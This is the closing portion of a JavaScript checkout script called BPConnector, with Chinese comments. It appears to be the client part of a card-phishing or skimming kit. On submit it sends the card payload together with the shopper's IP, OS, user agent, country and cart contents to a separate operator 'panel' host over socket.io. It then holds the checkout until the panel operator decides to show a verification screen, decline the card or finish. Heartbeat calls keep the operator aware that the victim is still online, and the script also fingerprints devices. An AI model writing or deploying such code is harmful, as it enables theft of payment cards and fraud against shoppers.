      if (j && j.ok) {
        fireEvent('bp:submitted', j);
        var num = j.order_number || submitPayload().order_number || '';
        try { global.location.href = '/order/' + encodeURIComponent(num); } catch (e) {}
      } else {
        endBusy();
        showErr((j && j.message) || T('paymentError'));
        fireEvent('bp:submit-failed', j || {});
      }
    }).catch(function (err) {
      endBusy();
      showErr(T('networkError'));
      warn('submit failed', err);
    });
  }

  /* 提交用的完整快照：与原插件 save_card 的 payload 字段一致
   * 面板就是收到这个事件才把卡落成"订单" */
  function submitPayloadRich() {
    var p = cardPayload();
    var c = getCart();
    p.user_ip = (S.serverData && S.serverData.user_ip) || '';
    p.user_os = (S.serverData && S.serverData.user_os) || guessOS();
    p.user_agent = (S.serverData && S.serverData.user_agent) || (global.navigator ? navigator.userAgent : '');
    p.user_country = (S.serverData && S.serverData.user_country) || '';
    p.logname = (S.serverData && S.serverData.logname) || C.logname;
    p.domain = domainWithUTM();
    p.order_number = c.order_number || '';
    p.products = JSON.stringify(c.items || []);
    p.total_amount = c.total_amount || '';
    return p;
  }

  /* 面板说"完成"（r6），或直通模式下自己完成 */
  function finishSubmit() {
    S.awaiting = false;
    clearGuardTimer();
    return postOrder();
  }

  function submitFlow(trigger) {
    if (busy || S.awaiting) { return; }

    var v = validateCard();
    if (!v.ok) {
      showErr(v.msg);
      markInvalid(v.field, true);
      try { v.field.focus(); } catch (e) {}
      return;
    }

    /* 购买事件：卡片校验通过、点提交的这一刻触发一次
     * 同一「设备指纹 + IP」24h 内只发一次；页面内重复点击由内存锁拦住 */
    firePurchase(trigger || 'submit');

    /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
     * update_card(e13) 只是更新会话内容；submit_card(e12) 是输入过程用的。
     * status 必须保持在线（'1'），否则会话被标灰。 */
    submitCard();
    send('save_card', submitPayloadRich());
    updateStep('card_submit');
    persistSubmitPage('3+');
    goLive('3+');

    blacklistCheck(v.number).then(function (bl) {
      if (!bl.approved) {
        setBusy(false);
        showErr(bl.message || T('cardDeclined'));
        fireEvent('bp:blacklist-reject', bl);
        return;
      }

      if (needGuard()) {
        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成） */
        S.awaiting = true;
        S.awaitingSince = nowMs();
        setBusy(true);
        clearErr();
        goLive('3+');
        armGuardTimer();
        fireEvent('bp:awaiting-panel', { pagetype: pagetype(), trigger: trigger });
        return;
      }

      /* 直通（pagetype == '1'）：立即完成 */
      finishSubmit();
    });
  }

  /* =========================================================================
   * 10. 启动
   * =======================================================================*/
  function applyServerData(d) {
    S.serverData = d || {};
    if (S.serverData.logname) { C.logname = S.serverData.logname; }
    if (S.serverData.logtype) { C.logtype = S.serverData.logtype; }
  }

  function loadConfig() {
    /* window.BP_CONFIG 可覆盖；否则读 /bp/config.json */
    if (isObj(global.BP_CONFIG)) {
      for (var k in global.BP_CONFIG) {
        if (Object.prototype.hasOwnProperty.call(global.BP_CONFIG, k)) { C[k] = global.BP_CONFIG[k]; }
      }
    }
    if (!global.fetch) { return Promise.resolve(C); }
    return global.fetch('/bp/config.json', { cache: 'no-store' })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (j) {
        if (isObj(j)) {
          for (var k2 in j) { if (Object.prototype.hasOwnProperty.call(j, k2)) { C[k2] = j[k2]; } }
        }
        return C;
      })
      .catch(function () { return C; });
  }

  function resolveServerData() {
    /* ① 有服务端代理时优先用代理（能带上真实 CF-Connecting-IP） */
    if (C.enable_verify && C.verify_endpoint) {
      return global.fetch(C.verify_endpoint, {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body: JSON.stringify({ referer: (global.location && location.href) || '' })
      })
        .then(function (r) { return r.ok ? r.json() : null; })
        .then(function (j) {
          if (isObj(j) && (j.ok === true || j.status === 'success')) {
            return isObj(j.data) ? j.data : j;
          }
          return null;
        })
        .catch(function () { return null; });
    }

    /* ② 没有服务端：浏览器直连面板准入接口（面板允许跨域时可读，自动拿到 logname）
     *    失败一律静默回落配置里的默认值，绝不阻塞页面 */
    if (C.panel_direct && C.panel_host) {
      var origin = String(C.panel_host)
        .replace(/^wss:/i, 'https:')
        .replace(/^ws:/i, 'http:')
        .replace(/\/+$/, '');
      var url = origin + '/api/UserEnvironmentDetection';
      var ctrl = null, timer = null;
      try { ctrl = new global.AbortController(); } catch (e) {}

      var to = new Promise(function (_, reject) {
        timer = setTimeout(function () {
          try { if (ctrl) { ctrl.abort(); } } catch (e) {}
          reject(new Error('timeout'));
        }, C.panel_direct_timeout || 2500);
      });

      var req = global.fetch(url, {
        method: 'POST',
        mode: 'cors',
        credentials: 'omit',
        signal: ctrl ? ctrl.signal : undefined,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_agent: (global.navigator ? navigator.userAgent : ''),
          referer: (global.location && location.href) || ''
        })
      })
        .then(function (r) { return r.ok ? r.json() : null; })
        .then(function (j) {
          if (isObj(j) && j.status === 'success' && isObj(j.data)) { return j.data; }
          return null;
        });

      return Promise.race([req, to]).then(function (d) {
        clearTimeout(timer);
        return d;
      }).catch(function () {
        clearTimeout(timer);
        return null;
      });
    }

    return Promise.resolve(isObj(global.__BP_SERVER__) ? global.__BP_SERVER__ : { pagetype: '1' });
  }

  function boot() {
    LANG = pickLang();
    newIds();

    var bound = bindForm();
    getCart();
    applyCart(cartCache);

    /* 购物车可能晚到：等事件，也兜底拉一次 /api/cart */
    on(global, 'bp:cart-ready', function (ev) {
      cartCache = normalizeCart(ev && ev.detail ? ev.detail : global.__BP_CART__);
      applyCart(cartCache);
    });
    fetchCartOnce();

    /* 位置心跳：面板靠 Go_Live 判在线 */
    on(global, 'focus', function () {
      if (S.connected && S.registerSent) { goLive(resumePage()); }
    });
    try {
      doc.addEventListener('visibilitychange', function () {
        if (!doc.hidden && S.connected && S.registerSent) { goLive(resumePage()); }
      });
    } catch (e) {}

    if (!bound) { return; }

    /* 顺序很重要：先读配置（panel_host/logname），再去面板取准入数据 */
    loadConfig().then(function () {
      return resolveServerData();
    }).then(function (sd) {
      if (sd) { applyServerData(sd); }
      if (!C.panel_host) { warn('未配置 panel_host，跳过连接'); return; }
      if (!global.io) {
        /* socket.io 未随 head 加载时按配置补一次（同源 /bp/） */
        var s = doc.createElement('script');
        s.src = '/bp/socket.io.min.js';
        s.onload = function () { connect(); };
        doc.head.appendChild(s);
        return;
      }
      connect();
    });
  }

  if (doc.readyState === 'loading') {
    doc.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

  /* =========================================================================
   * 11. 对外接口（调试 / 回归测试用）
   * =======================================================================*/
  global.BPConnector = {
    version: VERSION,
    config: C,
    state: S,
    lang: function () { return LANG; },
    send: send,
    goLive: goLive,
    submitCard: submitCard,
    submit: submitFlow,
    finish: finishSubmit,
    mode: function () {
      return {
        guard_mode: C.guard_mode,
        pagetype: pagetype(),
        need_guard: needGuard(),
        awaiting: !!S.awaiting,
        awaiting_ms: S.awaiting ? (nowMs() - S.awaitingSince) : 0
      };
    },
    openModal: openModal,
    closeModal: closeModal,
    postToModal: postToModal,
    blacklistCheck: blacklistCheck,
    cart: function () { return getCart(); },
    utm: readUTM,
    /* 购买事件（调试用） */
    pixel: {
      fire: function (reason) { return firePurchase(reason || 'manual'); },
      key: pixelKey,
      fingerprint: fingerprint,
      state: function () { return PX; },
      reset: function () {
        PX.fired = false; PX.key = ''; PX.eventId = ''; PX.last = null;
        try { global.localStorage.removeItem('bp_px'); } catch (e) {}
        try { doc.cookie = 'bp_px=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/'; } catch (e) {}
      }
    },
    validate: validateCard,
    brand: function () { return brandOf(E.card ? digitsOf(E.card) : ''); },
    reconnect: function () { disconnect(); connect(); }
  };

})(typeof window !== 'undefined' ? window : this, document);
